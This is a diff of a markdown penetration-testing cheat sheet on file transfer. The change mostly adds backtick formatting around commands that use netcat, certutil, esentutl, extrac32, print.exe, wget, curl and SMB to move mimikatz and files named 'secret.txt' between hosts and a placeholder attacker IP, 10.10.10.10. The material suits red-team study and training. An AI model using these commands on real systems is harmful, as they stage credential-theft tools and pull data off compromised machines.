@@ -90,9 +90,9 @@ https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
 
 ## scp / pscp.exe
 
-pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt
+`pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt`
 
-pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt
+`pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt`
 
 
 ## certutil.exe
@@ -106,13 +106,13 @@ https://twitter.com/subtee/status/888122309852016641?lang=en
 
 ## certutil.exe base64
 
-certutil.exe -encode mimikatz.exe mimikatz.txt
+`certutil.exe -encode mimikatz.exe mimikatz.txt`
 
-certutil.exe -decode mimikatz.txt mimikatz.exe
+`certutil.exe -decode mimikatz.txt mimikatz.exe`
 
-cat binary.exe | base64 -w 0
+`cat binary.exe | base64 -w 0`
 
-echo {base64_data} | base64 -d > binary.exe
+`echo {base64_data} | base64 -d > binary.exe`
 
 
 ## WebDAV downloaders
@@ -120,22 +120,22 @@ echo {base64_data} | base64 -d > binary.exe
 
 ### makecab.exe
 
-C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab
+`C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab`
 
 
 ### esentutl.exe
 
-C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o
+`C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o`
 
 
 ### extrac32.exe
 
-C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt
+`C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt`
 
 
 ### print.exe
 
-C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe
+`C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe`
 
 Links:
 
@@ -147,27 +147,27 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 
 ## netcat
 
-nc -nlvp 8000 > mimi_incoming.exe
+`nc -nlvp 8000 > mimi_incoming.exe`
 
-nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe
+`nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe`
 
 
 ## web browser / server
 
-python -m SimpleHTTPServer 80
+`python -m SimpleHTTPServer 80`
 
-python3 -m http.server
+`python3 -m http.server`
 
-ruby -run -ehttpd . -p80
+`ruby -run -ehttpd . -p80`
 
-php -S 0.0.0.0:80
+`php -S 0.0.0.0:80`
 
-socat TCP-LISTEN:80,reuseaddr,fork
+`socat TCP-LISTEN:80,reuseaddr,fork`
 
 
 ## wget
 
-wget http://10.10.10.10:80/info.txt -O /tmp/info.txt
+`wget http://10.10.10.10:80/info.txt -O /tmp/info.txt`
 
 ## cscript wget.js
 
@@ -194,18 +194,20 @@ https://superuser.com/questions/25538/how-to-download-files-from-command-line-in
 
 ## curl
 
-curl -o /tmp/info.txt http://10.10.10.10:80/info.txt
+`curl -o /tmp/info.txt http://10.10.10.10:80/info.txt`
 
 
 ## rdesktop
 
-rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'
+`rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'`
 
 ## smb
 
+```
 smbclient //10.10.10.10/share -U username -W domain
-get test.txt
+get info.txt`
+```
 
-net use Q: \\10.10.10.10\share
+`net use Q: \\10.10.10.10\share`
 
-pushd \\10.10.10.10\share
+`pushd \\10.10.10.10\share`
